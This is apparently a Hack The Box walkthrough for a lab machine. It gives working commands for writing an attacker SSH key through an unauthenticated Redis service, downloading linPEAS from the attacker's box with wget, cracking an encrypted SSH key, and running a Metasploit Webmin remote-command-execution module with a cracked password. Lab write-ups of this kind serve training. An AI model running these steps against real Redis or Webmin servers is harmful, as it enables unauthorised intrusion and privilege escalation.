# Overview

## Recommended tools
- [feroxbuster](https://github.com/epi052/feroxbuster) : any directory buster will do (gobuster, dirb, dirbuster, etc.)
- nmap: A network scanner installed by default on kali. Can be used to identify running service, gather information on hosts, fingerprint services, and much more.
- redis-cli: Install by running `sudo apt-get install redis-tools` in terminal
- [linPEAS](https://github.com/carlospolop/PEASS-ng): A well maintained local enumeration script. Part of the PEASS suite which also covers windows local enumeration.
## OWASP Threats
- [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- 
# Initial enumeration
- nmap reveals two webpages, and [redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) listening on `6379`
```bash
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: The Cyber Geek's Personal Website
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   syn-ack Redis key-value store 4.0.9
10000/tcp open  http    syn-ack MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 066AF1F6A59FCB67495B545A6B81F371
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

- quickly check if `redis` requires authentication to execute commands by connecting with `redis-cli -h $IP` and issuing the `info` command in the prompt.
	- ![](Pasted%20image%2020230215160754.png)
	- `Redis` is not requiring authentication to perform at least *some* commands - circle back after enumerating the web servers as they typically have a larger attack surface.

## Web enum
### Port 80 (HTTP(s))
- Just a landing page for a future site
- ![](Pasted%20image%2020230215160854.png)
- Examining the page source code (Ctrl + U in your browser) doesnt reveal any commented language of use. Further enumerate the page using `feroxbuster` with `feroxbuster --url http://$IP -d 2 -T 2`
	- Nothing obviously vulnerable is found - continue searching for low hanging fruit
	- ![](Pasted%20image%2020230215161344.png)

### Port 10000 (HTTP(s))
- Nmap reveals this to be a Miniserv 1.9.10 server hosting Webmin httpd
	- No subdirectories were found - move on
	- ![](Pasted%20image%2020230215162233.png)

### Port 6379 (Redis)
- What we know:
	- Redis is susceptible to unauthenticated command execution as demonstrated above 
	- The server is serving SSH and HTTP
	- Looking through [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh) we see that it may be possible to push a SSH key we control to the `authorized_keys` file on the victim. 
	- **Why this works**: 
		- The `redis-cli` tool allowed us to connect to the victim redis service as the  system user `redis`. We also know the home directory of the user as determined through `config get dir`
		- ![](Pasted%20image%2020230215164226.png)
		- The `authorized_keys` file contains a list of approved public ssh keys that will allow users to connect to the victim host as the redis user as long as the attacker has the appropriate private key.

# Foothold
- Begin by executing the commands outlined [here](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh) to push a public key we own to the victim.
- In a kali terminal:
	- If you do not have a ssh key configured:
		- `ssh-keygen -t rsa`
	- `(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`
		- This takes your public key from the SSH key pair, spaces it accordingly, and outputs the text to a new file called `spaced_key.txt`
	- `cat spaced_key.txt | redis-cli -h $IP -x set ssh_key`
		- This takes the output of the `cat` command (the content of the txt file) and pipes it to the `redis-cli` tool
	- Reconnect to the `redis` server by entering `redis-cli -h $IP` in your terminal, and then the following into the `redis` prompt:
		- `config set dir /var/lib/redis/.ssh`
		- `config set dbfilename "authorized_keys"`
		- `save`
	- In a **new** Kali terminal window, type `ssh -i ~/.ssh/id_rsa redis@$IP` - this gives us a shell as the `redis` user. 
		- ![](Pasted%20image%2020230215165254.png)

## Local enumeration as the redis user

- Start by transferring the linpeas.sh script (see Required Tools)
	- Two ways to transfer:
		1. On kali using `scp` from the same directory as your `linpeas.sh` script, type `scp linpeas.sh redis@$IP:~/`
			- This leverages `ssh` to securely transfer the file - will be more stealthy than transferring using HTTP as this is encrypted
		2. On kali, using a simple webserver serving in the same directory as your `linpeas.sh` script type `python3 -m http.server 80`
			- On the victim host, select the directory you want to store your tools in and type `wget KALI_IP/linpeas.sh` - replace `KALI_IP` with the IP of your kali box.
			- You could use the `/dev/shm` directory to store tools/files that dont need to persist on reboot since this directory is typically writeable by most services/users. Its also volatile and will empty on reboot.
- Once transferred using either of the above methods, you will need to make the script executable for the `redis` user. This can be done by typing in your ssh session, `chmod +x linpeas.sh`
- To run the enumeration script, simply enter `./linpeas.sh` and wait.
	- This script will thoroughly enumerate the system by identifying low hanging fruit, enumerating key directories, running services, network status, and config files for credentials and other misconfiguration items. [Read the docs for a full run down](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- What leads to further exploitation is the apparent ssh key backup belonging to `Matt` - the other user found in `/home`
- ![](Pasted%20image%2020230215201617.png)
- This could be a valid ssh private key - at this point we should transfer this back to the host and try to `ssh` as the user `Matt`.
	- We know this is applicable to Matt given the group and user ownership as shown in the screenshot.


# Moving Latterally to Matt 

- Attempting to SSH as matt fails as the key is encrypted - it will require a password AND the private key.
- ![](Pasted%20image%2020230215201850.png)
- When a ssh key is encrypted, it will begin with the "Proc-Type..." block as seen above. A key that isnt encryped with a password will have neither the `Proc-Type` or `DEK-Info` lines.
-  To crack the key, we first have to generate a hash of the key file - this can be done with `ssh2john`
	- ![](Pasted%20image%2020230215202456.png)
- You can now crack this password two ways:
	1. On kali using the `john` tool:
		1. `john postman_hash -w=/usr/share/seclists/wordlists/rockyou.txt`
			1. john takes the  password hash file as the first argument, and a wordlist used to crack the password as the second argument. A common/reliable wordlist that isnt tuned at all is the rockyou wordlist that comes preinstalled with kali (`find / -name 'rockyou*' 2>/dev/null` to get the exact file location on your install), or you can use a wordlist from the [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) library. This method of cracking the password will be slower than cracking it on your host computer since the VM can't use your GPU to crack.
	2. On your host using `hashcat`:
		1. Copy the hash from kali to a file on your host and remove everything before the first `$` - in the screenshot above, the hash you save to a file should start with `$sshng$`. We use this identifier to determine the hash mode we need to run `hashcat` in by consulting the [hash list](https://hashcat.net/wiki/doku.php?id=example_hashes) - in our case, we are looking at a RSA/DSA/EC/OpenSSH Private Key which has a mode of 22911.
		2. After installing the hashcat executable, run it in a terminal on your host (not kali) with something like `./hashcat.exe -m 22911 -a 0 postman_hash .\rockyou.txt`.
		3. ![](Pasted%20image%2020230215203651.png)
		4. If you lose the terminal text for whatever reason, simply run the command again but append `--show` to it.
-  To connect as Matt, run the `ssh -i postman_rsa matt@$IP` command again, and enter the cracked password.
	- ![](Pasted%20image%2020230215204346.png)
- This is an arbitrary decision by the box maker to block SSH access here, but you can simply `su Matt` in the other terminal window you should still have open as the `redis` user.
	- ![](Pasted%20image%2020230215204532.png)
	- In a situation where you have multiple hosts interconnected, or have an active directory domain, it would be a good idea to blast these credentials out over the network with [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec). This is out of scope, but crackmapexec (cme) is a phenomenal tool so it had to be mentioned. 
- You can now get the first low privilege flag on the machine found in Matt's home directory. Submit this flag on the Hackthebox page for the box
	- ![](Pasted%20image%2020230215205339.png)

# Enumeration & Escalation as Matt

- Start by enumerating the system again either manually and with the `linpeas` script.
- Nothing immediately obvious sticks out - no interesting sudo binaries, config files, backups, cronjobs,....
- We have credentials...we **need** to try them against anything on the host that accepts credentials. This includes webpages
- Success...
	- ![](Pasted%20image%2020230215205548.png)


## Rooting the box (Matt -> Root)
- We're now authenticated to the webmin service, have some great enumeration information in front of us (that we have confirmed previously), and can start snooping around the various links for any further vulnerabilities.
- First check [exploit-db](https://www.exploit-db.com) for any exploits regarding Webmin 1.910 (identified on the dashboard above and by nmap)
- Theres many results when searching for webmin, but theres a potential easy button here with the [Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)]( https://www.exploit-db.com/exploits/46984) exploit.
- On Kali:
	1. Open metasploit in a new terminal window by running `msfconsole`
	2. In the prompt type `search webmin` resulting in something like
		1. ![](Pasted%20image%2020230215210920.png)
	3. Select `exploit/linux/http/webmin_packageup_rce` by typing `use 4`
	4. This will load the exploit and allow you to set exploit specific options:
		1. `set RHOST $IP` - this will set the remote host aka the victim
		2. `set RPORT 10000` - since we are attacking the webmin service, we need to point it towards the right webapp
		3. `set LHOST tun0` - rather than specifying a listening host IP, we can set a local interface. The Hackthebox runs on `tun0`
		4. `set USERNAME Matt` - this is case sensitive
		5. `set PASSWORD computer2008`
		6. `set SSL true` - we cant hit the webmin dashboard with HTTP, it requires HTTPS so we must enable SSL for the exploit as well
		7. `exploit`
- Success...
	- ![](Pasted%20image%2020230215211355.png)
- This is a horrible shell though, so we'll need to upgrade it for QoL purposes. The easiest way to do so is using python if its present on the system.
	- `which python`
	- `python -c 'import pty;pty.spawn("/bin/bash")'`
- ![](Pasted%20image%2020230215211514.png)


# Takeaways
- 